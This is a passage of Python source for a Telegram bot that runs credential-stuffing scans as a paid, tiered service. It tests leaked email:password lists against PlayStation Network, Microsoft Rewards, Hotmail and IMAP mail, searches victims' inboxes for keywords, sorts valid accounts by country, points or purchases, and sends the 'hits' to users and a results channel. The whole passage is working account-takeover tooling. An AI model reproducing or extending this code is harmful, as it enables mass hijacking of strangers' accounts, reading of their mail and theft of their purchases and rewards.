        result_text = f"✅ **BRUTE ROOT (ADVANCED) SCAN COMPLETED!**\n\n```\n📊 Total:    {final['total']:,}\n🎯 Hits:     {final['hits']:,}\n📱 2FA:      {final['two_fa']:,}\n❌ Bad:      {final['bad']:,}\n⚠️ Errors:   {final['errors']:,}\n```\n\n⏱️ Time: {final['elapsed']}"
        if hits:
            hits_content = "\n".join(hits)
            try:
                await context.bot.send_document(chat_id=chat_id, document=InputFile(io.BytesIO(hits_content.encode()), filename="brute_root_hits.txt"), caption=result_text, parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                await context.bot.send_message(chat_id=chat_id, text=result_text, parse_mode=ParseMode.MARKDOWN)
            # Post hits to results channel
            await self._post_hits_to_channel("brute_root", hits, user_id, context)
        else:
            await context.bot.send_message(chat_id=chat_id, text=result_text, parse_mode=ParseMode.MARKDOWN)
        self.key_manager.update_user_stats(user_id, len(unique_combos), len(hits))


    async def _start_rewards_scan(self, user_id: int, combos: List[str], threads: int, context: ContextTypes.DEFAULT_TYPE):
        unique_combos, removed_count = remove_duplicates(combos)
        if removed_count > 0:
            await context.bot.send_message(chat_id=self.user_sessions[user_id].get("chat_id", user_id), text=f"🔄 Duplicate remover: Removed {removed_count} duplicate combos. {len(unique_combos)} unique combos remaining.")
        tier = self._get_user_tier(user_id)
        limit = PREMIUM_TIERS[tier]["daily_limit"]
        max_threads = PREMIUM_TIERS[tier]["max_threads"]
        threads = min(threads, max_threads)
        
        scan_stats = LiveStats()
        chat_id = self.user_sessions.get(user_id, {}).get("chat_id")
        if not chat_id:
            return
        
        # Only enforce daily limit - AFTER validation
        daily_used = self.key_manager.get_daily_used(user_id)
        if daily_used + len(unique_combos) > limit:
            await context.bot.send_message(chat_id=chat_id, text=f"❌ Daily limit reached ({limit} lines). Upgrade to premium.")
            return
        if not self.key_manager.add_daily_used(user_id, len(unique_combos)):
            await context.bot.send_message(chat_id=chat_id, text="❌ Daily limit reached.")
            return
        progress_cb = self._create_live_progress_callback(chat_id, user_id, context, scan_stats)
        scan_stats.set_progress_callback(progress_cb)
        scan_stats.start(len(unique_combos))
        stop_event = Event()
        self.active_scans[user_id] = {'stop_event': stop_event, 'stats': scan_stats}
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        await self._show_live_stats(chat_id, user_id, context)
        hits = []
        two_fa_list = []
        bad = 0
        errors = 0
        results_lock = Lock()
        executor = ThreadPoolExecutor(max_workers=threads)
        loop = asyncio.get_running_loop()
        futures = []

        def worker(combo):
            nonlocal bad, errors
            if stop_event.is_set():
                return
            try:
                email, pwd = combo.split(':', 1)
                email, pwd = email.strip(), pwd.strip()
                scan_stats.increment_checked()
                res = self.rewards_engine.check_single(email, pwd)
                if res.get('status') == 'HIT':
                    scan_stats.increment_hits("rewards")
                    points = res.get('points', 0)
                    with results_lock:
                        hits.append(f"{email}:{pwd} | Points: {points}")
                elif res.get('status') == '2FA':
                    scan_stats.increment_2fa()
                    with results_lock:
                        two_fa_list.append(f"{email}:{pwd}")
                elif res.get('status') == 'BAD':
                    scan_stats.increment_bad()
                    with results_lock:
                        bad += 1
                else:
                    scan_stats.increment_errors()
                    with results_lock:
                        errors += 1
            except Exception as e:
                scan_stats.increment_errors()
                logger.error(f"Rewards error: {e}")

        for combo in unique_combos:
            futures.append(loop.run_in_executor(executor, worker, combo))
        for coro in asyncio.as_completed(futures):
            if stop_event.is_set():
                break
            try:
                await coro
            except:
                pass
        executor.shutdown(wait=True)
        scan_stats.stop()
        if user_id in self.active_scans:
            del self.active_scans[user_id]
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        final = scan_stats.get_snapshot()
        result_msg = f"✅ **REWARDS SCAN COMPLETED!**\n\n```\n📊 Total:    {final['total']:,}\n💎 Hits:     {final['reward_hits']:,}\n📱 2FA:      {final['two_fa']:,}\n❌ Bad:      {final['bad']:,}\n⚠️ Errors:   {final['errors']:,}\n```\n\n⏱️ Time: {final['elapsed']}"
        if hits:
            sorted_hits = sorted(hits, key=lambda x: int(x.split('Points:')[1].split()[0]) if 'Points:' in x else 0, reverse=True)
            hits_content = "\n".join(sorted_hits)
            try:
                await context.bot.send_document(chat_id=chat_id, document=InputFile(io.BytesIO(hits_content.encode()), filename=f"rewards_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"), caption=result_msg, parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                await context.bot.send_message(chat_id=chat_id, text=result_msg, parse_mode=ParseMode.MARKDOWN)
        else:
            await context.bot.send_message(chat_id=chat_id, text=result_msg, parse_mode=ParseMode.MARKDOWN)
        self.key_manager.update_user_stats(user_id, len(unique_combos), len(hits))

    async def _start_psn_scan(self, user_id: int, combos: List[str], threads: int, context: ContextTypes.DEFAULT_TYPE):
        unique_combos, removed_count = remove_duplicates(combos)
        if removed_count > 0:
            await context.bot.send_message(chat_id=self.user_sessions[user_id].get("chat_id", user_id), text=f"🔄 Duplicate remover: Removed {removed_count} duplicate combos. {len(unique_combos)} unique combos remaining.")
        tier = self._get_user_tier(user_id)
        is_premium = self.key_manager.is_premium(user_id)
        limit = PREMIUM_TIERS[tier]["daily_limit"]
        max_threads = PREMIUM_TIERS[tier]["max_threads"]
        threads = min(threads, max_threads)
        
        scan_stats = LiveStats()
        chat_id = self.user_sessions.get(user_id, {}).get("chat_id")
        if not chat_id:
            return
        
        # Only enforce daily limit for FREE users - AFTER validation
        if not is_premium:
            daily_used = self.key_manager.get_daily_used(user_id)
            if daily_used + len(unique_combos) > limit:
                await context.bot.send_message(chat_id=chat_id, text=f"❌ Daily limit reached ({limit} lines). Upgrade to premium.")
                return
            if not self.key_manager.add_daily_used(user_id, len(unique_combos)):
                await context.bot.send_message(chat_id=chat_id, text="❌ Daily limit reached.")
                return
        progress_cb = self._create_live_progress_callback(chat_id, user_id, context, scan_stats)
        scan_stats.set_progress_callback(progress_cb)
        scan_stats.start(len(unique_combos))
        stop_event = Event()
        self.active_scans[user_id] = {'stop_event': stop_event, 'stats': scan_stats}
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        await self._show_live_stats(chat_id, user_id, context)

        psn_hits = []      # accounts with orders > 0
        free_hits = []     # HIT but orders == 0
        two_fa_list = []
        lock = Lock()
        executor = ThreadPoolExecutor(max_workers=threads)
        loop = asyncio.get_running_loop()
        futures = []

        def worker(combo):
            if stop_event.is_set():
                return
            try:
                email, pwd = combo.split(':', 1)
                email, pwd = email.strip(), pwd.strip()
                scan_stats.increment_checked()
                res = self.psn_engine.check_account(email, pwd)
                if res.get('status') == 'HIT':
                    # THIS IS A HIT - COUNTS IN STATS
                    scan_stats.increment_hits("psn")
                    line = f"{email}:{pwd}"
                    orders = res.get('orders', 0)
                    if orders > 0:
                        line += f" | Orders: {orders}"
                        # Add first purchase if available
                        purchases = res.get('purchases', [])
                        if purchases and purchases[0].get('item'):
                            line += f" | Latest: {purchases[0]['item'][:30]}"
                        with lock:
                            psn_hits.append(line)
                    else:
                        with lock:
                            free_hits.append(line)
                elif res.get('status') == '2FA':
                    scan_stats.increment_2fa()
                    with lock:
                        two_fa_list.append(f"{email}:{pwd}")
                elif res.get('status') in ('BAD', 'ERROR'):
                    scan_stats.increment_bad()
                else:
                    scan_stats.increment_errors()
            except Exception as e:
                scan_stats.increment_errors()
                logger.error(f"PSN error: {e}")

        for combo in unique_combos:
            futures.append(loop.run_in_executor(executor, worker, combo))
        for coro in asyncio.as_completed(futures):
            if stop_event.is_set():
                break
            try:
                await coro
            except:
                pass
        executor.shutdown(wait=True)
        scan_stats.stop()
        if user_id in self.active_scans:
            del self.active_scans[user_id]
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]

        final = scan_stats.get_snapshot()
        total_hits = len(psn_hits) + len(free_hits)
        result_msg = f"✅ **PSN SCAN COMPLETED!**\n\n```\n📊 Total:    {final['total']:,}\n✅ Checked:  {final['checked']:,}\n🎯 Total Hits: {total_hits}\n   ├─ PSN Hits: {len(psn_hits)}\n   └─ Free Hits: {len(free_hits)}\n📱 2FA:      {len(two_fa_list)}\n❌ Bad:      {final['bad']:,}\n⚠️ Errors:   {final['errors']:,}\n```\n\n⏱️ Time: {final['elapsed']}"

        # Send PSN hits file (accounts with purchases)
        if psn_hits:
            filepath = self.zip_creator.create_simple_txt(psn_hits, f"psn_hits_{user_id}_{int(time.time())}.txt")
            if filepath:
                with open(filepath, 'rb') as f:
                    await context.bot.send_document(chat_id=chat_id, document=InputFile(f, filename="psn_hits.txt"), caption=f"{result_msg}\n\n🔥 **PSN HITS:** {len(psn_hits)} accounts with PlayStation purchases", parse_mode=ParseMode.MARKDOWN)
                os.remove(filepath)
        else:
            await context.bot.send_message(chat_id=chat_id, text=result_msg, parse_mode=ParseMode.MARKDOWN)

        # Send free hits file (valid accounts without PSN)
        if free_hits:
            filepath = self.zip_creator.create_simple_txt(free_hits, f"psn_free_{user_id}_{int(time.time())}.txt")
            if filepath:
                with open(filepath, 'rb') as f:
                    await context.bot.send_document(chat_id=chat_id, document=InputFile(f, filename="psn_free.txt"), caption=f"💎 **Valid accounts without PSN:** {len(free_hits)}", parse_mode=ParseMode.MARKDOWN)
                os.remove(filepath)

        # Send 2FA file
        if two_fa_list:
            filepath = self.zip_creator.create_simple_txt(two_fa_list, f"psn_2fa_{user_id}_{int(time.time())}.txt")
            if filepath:
                with open(filepath, 'rb') as f:
                    await context.bot.send_document(chat_id=chat_id, document=InputFile(f, filename="psn_2fa.txt"), caption=f"🔐 **2FA Accounts:** {len(two_fa_list)}", parse_mode=ParseMode.MARKDOWN)
                os.remove(filepath)

        self.key_manager.update_user_stats(user_id, len(unique_combos), total_hits)


    async def _start_imap_scan(self, user_id: int, combos: List[str], threads: int, context: ContextTypes.DEFAULT_TYPE):
        unique_combos, removed_count = remove_duplicates(combos)
        if removed_count > 0:
            await context.bot.send_message(chat_id=self.user_sessions[user_id].get("chat_id", user_id), text=f"🔄 Duplicate remover: Removed {removed_count} duplicate combos. {len(unique_combos)} unique combos remaining.")
        tier = self._get_user_tier(user_id)
        is_premium = self.key_manager.is_premium(user_id)
        limit = PREMIUM_TIERS[tier]["daily_limit"]
        max_threads = PREMIUM_TIERS[tier]["max_threads"]
        threads = min(threads, max_threads)
        
        scan_stats = LiveStats()
        chat_id = self.user_sessions.get(user_id, {}).get("chat_id")
        if not chat_id:
            return
        
        # Only enforce daily limit for FREE users - AFTER validation
        if not is_premium:
            daily_used = self.key_manager.get_daily_used(user_id)
            if daily_used + len(unique_combos) > limit:
                await context.bot.send_message(chat_id=chat_id, text=f"❌ Daily limit reached ({limit} lines). Upgrade to premium.")
                return
            if not self.key_manager.add_daily_used(user_id, len(unique_combos)):
                await context.bot.send_message(chat_id=chat_id, text="❌ Daily limit reached.")
                return
        progress_cb = self._create_live_progress_callback(chat_id, user_id, context, scan_stats)
        scan_stats.set_progress_callback(progress_cb)
        scan_stats.start(len(unique_combos))
        stop_event = Event()
        self.active_scans[user_id] = {'stop_event': stop_event, 'stats': scan_stats}
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        await self._show_live_stats(chat_id, user_id, context)
        hits = []
        lock = Lock()
        executor = ThreadPoolExecutor(max_workers=threads)
        loop = asyncio.get_running_loop()
        futures = []

        def worker(combo):
            if stop_event.is_set():
                return
            try:
                email, pwd = combo.split(':', 1)
                email, pwd = email.strip(), pwd.strip()
                scan_stats.increment_checked()
                res = self.imap_engine.check_account(email, pwd)
                if res.get('status') == 'HIT':
                    scan_stats.increment_hits("imap")
                    with lock:
                        hits.append(f"{email}:{pwd}")
                elif res.get('status') == 'BAD':
                    scan_stats.increment_bad()
                else:
                    scan_stats.increment_errors()
            except Exception as e:
                scan_stats.increment_errors()
                logger.error(f"IMAP error: {e}")

        for combo in unique_combos:
            futures.append(loop.run_in_executor(executor, worker, combo))
        for coro in asyncio.as_completed(futures):
            if stop_event.is_set():
                break
            try:
                await coro
            except:
                pass
        executor.shutdown(wait=True)
        scan_stats.stop()
        if user_id in self.active_scans:
            del self.active_scans[user_id]
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        final = scan_stats.get_snapshot()
        result_msg = f"✅ **IMAP Checker Completed**\n\n```\n📊 Total:    {final['total']:,}\n✅ Checked:  {final['checked']:,}\n🎯 Hits:     {final['hits']:,}\n❌ Bad:      {final['bad']:,}\n⚠️ Errors:   {final['errors']:,}\n```\n\n⏱️ Time: {final['elapsed']}"
        if hits:
            filepath = self.zip_creator.create_simple_txt(hits, f"imap_{user_id}_{int(time.time())}.txt")
            if filepath:
                with open(filepath, 'rb') as f:
                    await context.bot.send_document(chat_id=chat_id, document=InputFile(f, filename=os.path.basename(filepath)), caption=result_msg, parse_mode=ParseMode.MARKDOWN)
                try:
                    os.remove(filepath)
                except:
                    pass
            else:
                await context.bot.send_message(chat_id=chat_id, text=result_msg, parse_mode=ParseMode.MARKDOWN)
        else:
            await context.bot.send_message(chat_id=chat_id, text=result_msg, parse_mode=ParseMode.MARKDOWN)
        self.key_manager.update_user_stats(user_id, len(unique_combos), len(hits))

    async def _start_imap_inboxer_scan(self, user_id: int, combos: List[str], keywords: List[str], threads: int, context: ContextTypes.DEFAULT_TYPE):
        """IMAP Inboxer: validate + search inbox for multiple keywords - saves hits in {keyword}.txt files"""
        if not self.imap_inbox_engine:
            await context.bot.send_message(chat_id=self.user_sessions[user_id].get("chat_id", user_id), text="❌ IMAP Inboxer not available.")
            return
        unique_combos, removed_count = remove_duplicates(combos)
        if removed_count > 0:
            await context.bot.send_message(chat_id=self.user_sessions[user_id].get("chat_id", user_id), text=f"🔄 Duplicate remover: Removed {removed_count} duplicate combos. {len(unique_combos)} unique combos remaining.")
        tier = self._get_user_tier(user_id)
        is_premium = self.key_manager.is_premium(user_id)
        limit = PREMIUM_TIERS[tier]["daily_limit"]
        max_threads = PREMIUM_TIERS[tier]["max_threads"]
        threads = min(threads, max_threads)
        
        scan_stats = LiveStats()
        chat_id = self.user_sessions.get(user_id, {}).get("chat_id")
        if not chat_id:
            return
        
        # Only enforce daily limit for FREE users - AFTER validation
        if not is_premium:
            daily_used = self.key_manager.get_daily_used(user_id)
            if daily_used + len(unique_combos) > limit:
                await context.bot.send_message(chat_id=chat_id, text=f"❌ Daily limit reached ({limit} lines). Upgrade to premium.")
                return
            if not self.key_manager.add_daily_used(user_id, len(unique_combos)):
                await context.bot.send_message(chat_id=chat_id, text="❌ Daily limit reached.")
                return
        progress_cb = self._create_live_progress_callback(chat_id, user_id, context, scan_stats)
        scan_stats.set_progress_callback(progress_cb)
        scan_stats.start(len(unique_combos))
        stop_event = Event()
        self.active_scans[user_id] = {'stop_event': stop_event, 'stats': scan_stats}
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        await self._show_live_stats(chat_id, user_id, context)

        # Store hits per keyword
        keyword_hits: Dict[str, List[str]] = {kw: [] for kw in keywords}
        lock = Lock()
        executor = ThreadPoolExecutor(max_workers=threads)
        loop = asyncio.get_running_loop()
        futures = []

        def worker(combo):
            if stop_event.is_set():
                return
            try:
                email, pwd = combo.split(':', 1)
                email, pwd = email.strip(), pwd.strip()
                scan_stats.increment_checked()
                for keyword in keywords:
                    if not keyword or not keyword.strip():
                        continue
                    res = self.imap_inbox_engine.check_account(email, pwd, keyword.strip())
                    if res.get('status') == 'HIT' and res.get('found_count', 0) > 0:
                        scan_stats.increment_hits("imap")
                        found = res.get('found_count', 0)
                        last_date = res.get('last_date', '')
                        hit_line = f"{email}:{pwd}"
                        if found:
                            hit_line += f" | Found: {found} times"
                        if last_date:
                            hit_line += f" | Last: {last_date}"
                        with lock:
                            keyword_hits[keyword.strip()].append(hit_line)
                        break  # Once found for one keyword, skip others for this account
            except Exception as e:
                scan_stats.increment_errors()
                logger.error(f"IMAP Inboxer error: {e}")

        for combo in unique_combos:
            futures.append(loop.run_in_executor(executor, worker, combo))
        for coro in asyncio.as_completed(futures):
            if stop_event.is_set():
                break
            try:
                await coro
            except:
                pass
        executor.shutdown(wait=True)
        scan_stats.stop()
        if user_id in self.active_scans:
            del self.active_scans[user_id]
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]

        final = scan_stats.get_snapshot()
        result_msg = f"✅ **IMAP Inboxer Completed**\n\n```\n📊 Total:    {final['total']:,}\n✅ Checked:  {final['checked']:,}\n🎯 Hits:     {final['hits']:,}\n❌ Bad:      {final['bad']:,}\n⚠️ Errors:   {final['errors']:,}\n```\n\n🔑 **Keywords:** {', '.join(keywords)}\n⏱️ Time: {final['elapsed']}"

        # Send ZIP file with all keyword results
        all_results = {kw: hits for kw, hits in keyword_hits.items() if hits}
        if all_results:
            zip_path = self.zip_creator.create_keyword_zip(all_results, f"imap_inboxer_{int(time.time())}.zip")
            if zip_path:
                with open(zip_path, 'rb') as f:
                    await context.bot.send_document(chat_id=chat_id, document=InputFile(f, filename=os.path.basename(zip_path)), caption=result_msg, parse_mode=ParseMode.MARKDOWN)
                try:
                    os.remove(zip_path)
                except:
                    pass
            else:
                await context.bot.send_message(chat_id=chat_id, text=result_msg, parse_mode=ParseMode.MARKDOWN)
        else:
            await context.bot.send_message(chat_id=chat_id, text=result_msg, parse_mode=ParseMode.MARKDOWN)

        total_hits = sum(len(hits) for hits in keyword_hits.values())
        self.key_manager.update_user_stats(user_id, len(unique_combos), total_hits)

    async def _start_hotmail_bruter_scan(self, user_id: int, combos: List[str], threads: int, context: ContextTypes.DEFAULT_TYPE):
        unique_combos, removed_count = remove_duplicates(combos)
        if removed_count > 0:
            await context.bot.send_message(chat_id=self.user_sessions[user_id].get("chat_id", user_id), text=f"🔄 Duplicate remover: Removed {removed_count} duplicate combos. {len(unique_combos)} unique combos remaining.")
        tier = self._get_user_tier(user_id)
        is_premium = self.key_manager.is_premium(user_id)
        limit = PREMIUM_TIERS[tier]["daily_limit"]
        max_threads = PREMIUM_TIERS[tier]["max_threads"]
        threads = min(threads, max_threads)
        
        scan_stats = LiveStats()
        chat_id = self.user_sessions.get(user_id, {}).get("chat_id")
        if not chat_id:
            return
        
        # Only enforce daily limit for FREE users - AFTER validation
        if not is_premium:
            daily_used = self.key_manager.get_daily_used(user_id)
            if daily_used + len(unique_combos) > limit:
                await context.bot.send_message(chat_id=chat_id, text=f"❌ Daily limit reached ({limit} lines). Upgrade to premium.")
                return
            if not self.key_manager.add_daily_used(user_id, len(unique_combos)):
                await context.bot.send_message(chat_id=chat_id, text="❌ Daily limit reached.")
                return
        progress_cb = self._create_live_progress_callback(chat_id, user_id, context, scan_stats)
        scan_stats.set_progress_callback(progress_cb)
        scan_stats.start(len(unique_combos))
        stop_event = Event()
        self.active_scans[user_id] = {'stop_event': stop_event, 'stats': scan_stats}
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        await self._show_live_stats(chat_id, user_id, context)
        hits = []
        lock = Lock()
        executor = ThreadPoolExecutor(max_workers=threads)
        loop = asyncio.get_running_loop()
        futures = []

        def worker(combo):
            if stop_event.is_set():
                return
            try:
                email, pwd = combo.split(':', 1)
                email, pwd = email.strip(), pwd.strip()
                scan_stats.increment_checked()
                res = self.hotmail_bruter_engine.check_account(email, pwd)
                if res.get('status') == 'HIT':
                    scan_stats.increment_hits("bruter")
                    with lock:
                        hits.append(f"{email}:{pwd} | HIT")
                elif res.get('status') == '2FA':
                    scan_stats.increment_2fa()
                elif res.get('status') in ('BAD', 'LOCKED'):
                    scan_stats.increment_bad()
                else:
                    scan_stats.increment_errors()
            except Exception as e:
                scan_stats.increment_errors()
                logger.error(f"Bruter error: {e}")

        for combo in unique_combos:
            futures.append(loop.run_in_executor(executor, worker, combo))
        for coro in asyncio.as_completed(futures):
            if stop_event.is_set():
                break
            try:
                await coro
            except:
                pass
        executor.shutdown(wait=True)
        scan_stats.stop()
        if user_id in self.active_scans:
            del self.active_scans[user_id]
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        if hits:
            filepath = self.zip_creator.create_simple_txt(hits, f"bruter_{user_id}_{int(time.time())}.txt")
            if filepath:
                await context.bot.send_document(chat_id=chat_id, document=open(filepath, 'rb'), caption=f"✅ Hotmail Bruter scan completed.\nHits: {len(hits)}")
        else:
            await context.bot.send_message(chat_id=chat_id, text="✅ Hotmail Bruter scan completed. No hits found.")
        self.key_manager.update_user_stats(user_id, len(unique_combos), len(hits))

    async def _start_country_scan(self, user_id: int, combos: List[str], target_countries: List[str], threads: int, context: ContextTypes.DEFAULT_TYPE):
        """Country-based cracking scan"""
        try:
            from country_cracker_engine import CountryCrackerEngine
        except ImportError:
            await context.bot.send_message(chat_id=self.user_sessions[user_id].get("chat_id", user_id),
                                          text="❌ Country Cracker engine not available.")
            return
        
        unique_combos, removed_count = remove_duplicates(combos)
        if removed_count > 0:
            await context.bot.send_message(chat_id=self.user_sessions[user_id].get("chat_id", user_id), 
                                          text=f"🔄 Duplicate remover: Removed {removed_count} duplicate combos. {len(unique_combos)} unique combos remaining.")
        
        tier = self._get_user_tier(user_id)
        is_premium = self.key_manager.is_premium(user_id)
        limit = PREMIUM_TIERS[tier]["daily_limit"]
        max_threads = PREMIUM_TIERS[tier]["max_threads"]
        threads = min(threads,max_threads)
        
        scan_stats = LiveStats()
        chat_id = self.user_sessions.get(user_id, {}).get("chat_id")
        if not chat_id:
            return
        
        # Only enforce daily limit for FREE users - AFTER validation
        if not is_premium:
            daily_used = self.key_manager.get_daily_used(user_id)
            if daily_used + len(unique_combos) > limit:
                await context.bot.send_message(chat_id=chat_id, text=f"❌ Daily limit reached ({limit} lines). Upgrade to premium.")
                return
            if not self.key_manager.add_daily_used(user_id, len(unique_combos)):
                await context.bot.send_message(chat_id=chat_id, text="❌ Daily limit reached.")
                return
        
        progress_cb = self._create_live_progress_callback(chat_id, user_id, context, scan_stats)
        scan_stats.set_progress_callback(progress_cb)
        scan_stats.start(len(unique_combos))
        stop_event = Event()
        
        # Mark as premium scan if user is premium
        if is_premium:
            self.active_premium_scans[user_id] = {'stop_event': stop_event, 'stats': scan_stats}
        else:
            self.active_scans[user_id] = {'stop_event': stop_event, 'stats': scan_stats}
        
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        
        await self._show_live_stats(chat_id, user_id, context)
        
        hits_by_country = defaultdict(list)
        lock = Lock()
        executor = ThreadPoolExecutor(max_workers=threads)
        loop = asyncio.get_running_loop()
        futures = []

        def worker(combo):
            if stop_event.is_set():
                return
            try:
                email, pwd = combo.split(':', 1)
                email, pwd = email.strip(), pwd.strip()
                scan_stats.increment_checked()
                
                # Use CountryChecker from country_cracker_engine
                from country_cracker_engine import CountryChecker
                checker = CountryChecker(target_countries=target_countries, proxy_manager=None)
                res = checker.check(email, pwd)
                
                country = res.get("country", "Unknown")
                status = res.get("status", "ERROR")
                
                if status == "HIT":
                    scan_stats.increment_hits()
                    with lock:
                        hits_by_country[country].append(f"{email}:{pwd} | {country}")
                        # Update user's cracked count
                        with self.leaderboard_lock:
                            self.user_cracked_count[user_id] = self.user_cracked_count.get(user_id, 0) + 1
                elif status == "2FA":
                    scan_stats.increment_2fa()
                elif status in ("BAD", "COUNTRY_MISMATCH"):
                    scan_stats.increment_bad()
                else:
                    scan_stats.increment_errors()
            except Exception as e:
                scan_stats.increment_errors()
                logger.error(f"Country scan error: {e}")

        for combo in unique_combos:
            futures.append(loop.run_in_executor(executor, worker, combo))
        
        for coro in asyncio.as_completed(futures):
            if stop_event.is_set():
                break
            try:
                await coro
            except:
                pass
        
        executor.shutdown(wait=True)
        scan_stats.stop()
        
        # Remove from active scans
        if user_id in self.active_scans:
            del self.active_scans[user_id]
        if user_id in self.active_premium_scans:
            del self.active_premium_scans[user_id]
        
        with self.status_lock:
            if user_id in self.status_messages:
                del self.status_messages[user_id]
        
        # Prepare results
        total_hits = sum(len(combos_list) for combos_list in hits_by_country.values())
        
        if hits_by_country:
            # Create individual country files and ZIP them
            zip_files = {}
            temp_files = []
            
            for country, combos_list in hits_by_country.items():
                # Clean country name for filename
                clean_country = country.replace(" ", "_").replace("/", "_")
                filename = f"{clean_country}.txt"
                
                # Create temp file with combos
                temp_dir = tempfile.gettempdir()
                temp_path = os.path.join(temp_dir, f"{clean_country}_{user_id}_{int(time.time())}.txt")
                
                try:
                    with open(temp_path, 'w', encoding='utf-8') as f:
                        for combo in combos_list:
                            # Remove the " | {country}" suffix since it's now the filename
                            combo_clean = combo.replace(f" | {country}", "").replace(f" | {clean_country}", "")
                            f.write(combo_clean + "\n")
                    
                    zip_files[filename] = temp_path
                    temp_files.append(temp_path)
                except Exception as e:
                    logger.error(f"Error creating country file {country}: {e}")
            
            # Create ZIP with country files
            if zip_files:
                try:
                    zip_path = os.path.join(tempfile.gettempdir(), f"country_results_{user_id}_{int(time.time())}.zip")
                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                        for filename, filepath in zip_files.items():
                            zf.write(filepath, arcname=filename)
                    
                    # Send ZIP
                    with open(zip_path, 'rb') as zf_handle:
                        await context.bot.send_document(
                            chat_id=chat_id, 
                            document=zf_handle,
                            caption=f"🌍 **Country Cracker Results**\n\n📊 Total Hits: {total_hits}\n🌎 Countries: {len(hits_by_country)}\n\n📁 File format: `CountryName.txt`\nEach file contains combos from that country.",
                            parse_mode=ParseMode.MARKDOWN
                        )
                    
                    # Cleanup
                    try:
                        os.remove(zip_path)
                    except:
                        pass
                    
                    for f in temp_files:
                        try:
                            os.remove(f)
                        except:
                            pass
                    
                except Exception as e:
                    logger.error(f"Error creating country results ZIP: {e}")
                    await context.bot.send_message(chat_id=chat_id, text=f"❌ Error creating ZIP file: {str(e)}")
            else:
                await context.bot.send_message(chat_id=chat_id, text="✅ Country Cracker scan completed. No hits found.")
        else:
            await context.bot.send_message(chat_id=chat_id, text="✅ Country Cracker scan completed. No hits found.")
        
        self.key_manager.update_user_stats(user_id, len(unique_combos), total_hits)

    async def _start_keyword_inbox_scan(self, user_id: int, combos: List[str], keywords: List[str], threads: int, context: ContextTypes.DEFAULT_TYPE):
        """Keyword-based Hotmail inbox scanner with standard stats"""
        if not FullCustomInboxEngine:
            await context.bot.send_message(chat_id=self.user_sessions[user_id].get("chat_id", user_id),
                                          text="❌ Custom inbox engine not available.")
            return
        
        try:
            chat_id = self.user_sessions.get(user_id, {}).get("chat_id", user_id)
            unique_combos, removed_count = remove_duplicates(combos)
            
            # Create stats tracker so /live can show progress
            scan_stats = LiveStats()
            self.active_scans[user_id] = {'stop_event': Event(), 'stats': scan_stats}
            scan_stats.start(len(unique_combos))
            
            # Clear previous status messages
            with self.status_lock:
                if user_id in self.status_messages:
                    del self.status_messages[user_id]
            
            # Show live stats automatically as soon as scan starts
            await self._show_live_stats(chat_id, user_id, context)
            
            if removed_count > 0:
                await context.bot.send_message(chat_id=chat_id, 
                    text=f"🔄 Removed {removed_count} duplicate combos. {len(unique_combos)} unique remaining.")
            
            # Create scanner
            scanner = FullCustomInboxEngine(keywords=keywords)
            
            start_time = time.time()
            checked = 0
            loop = asyncio.get_running_loop()
            
            results_summary = {
                'hits': 0,
                '2fa': 0,
                'bad': 0,
                'errors': 0
            }
            
            def on_result(result):
                """Callback for each account check"""
                nonlocal checked
                checked += 1
                status = result.get('status', '')
                
                if status == 'HIT':
                    results_summary['hits'] += 1
                    scan_stats.increment_hits()
                    email = result.get('email', '?')
                    kws = list(result.get('keywords', {}).keys())
                    logger.info(f"✅ HIT: {email} | Keywords: {kws}")
                elif status == '2FA':
                    results_summary['2fa'] += 1
                    scan_stats.increment_2fa()
                elif status == 'BAD':
                    results_summary['bad'] += 1
                    scan_stats.increment_bad()
                else:
                    results_summary['errors'] += 1
                
                scan_stats.increment_checked()
            
            # Run scan with callback IN BACKGROUND (doesn't block other users)
            # Use executor to run blocking scan in thread pool instead of blocking main event loop
            from functools import partial
            scan_func = partial(scanner.scan, combos=unique_combos, threads=threads, callback=on_result)
            stats = await loop.run_in_executor(None, scan_func)
            
            elapsed = time.time() - start_time
            cpm = (stats['checked'] / elapsed * 60) if elapsed > 0 else 0
            
            # Send FINAL report
            report_text = (
                f"✅ *Keyword Inbox Scan Complete!*\n\n"
                f"⏱️ Duration: {int(elapsed)}s ({cpm:.1f} CPM)\n"
                f"📊 Checked: {stats['checked']:,}\n"
                f"✨ *Hits: {stats['hits']:,}*\n"
                f"🔐 2FA: {stats['2fa']:,}\n"
                f"❌ Bad: {stats['bad']:,}\n\n"
                f"📁 Results saved automatically"
            )
            
            try:
                # Try to get the live stats message ID to update it
                with self.status_lock:
                    msg_id = self.status_messages.get(user_id)
                
                if msg_id:
                    await context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, 
                        text=report_text, parse_mode="Markdown")
                else:
                    await context.bot.send_message(chat_id=chat_id, text=report_text, parse_mode="Markdown")
            except Exception as e:
                logger.warning(f"Could not update message: {e}")
                await context.bot.send_message(chat_id=chat_id, text=report_text, parse_mode="Markdown")
            
            # Create report for export
            export = scanner.export_report()
            zip_path = export.get('zip_path')
            results_path = export.get('results_path')
            
            # Send ZIP file with all results organized
            if zip_path and os.path.exists(zip_path):
                try:
                    with open(zip_path, 'rb') as f:
                        await context.bot.send_document(
                            chat_id=chat_id,
                            document=InputFile(f, filename=os.path.basename(zip_path)),
                            caption="📦 *Complete Results Archive*\n\n"
                                   f"✨ Hits: {stats['hits']:,}\n"
                                   f"🔐 2FA: {stats['2fa']:,}",
                            parse_mode="Markdown"
                        )
                except Exception as e:
                    logger.error(f"ZIP upload error: {e}")
            
            # Send hits file separately with full data
            hits_file = os.path.join(results_path, "hits.txt")
            if os.path.exists(hits_file) and os.path.getsize(hits_file) > 0:
                try:
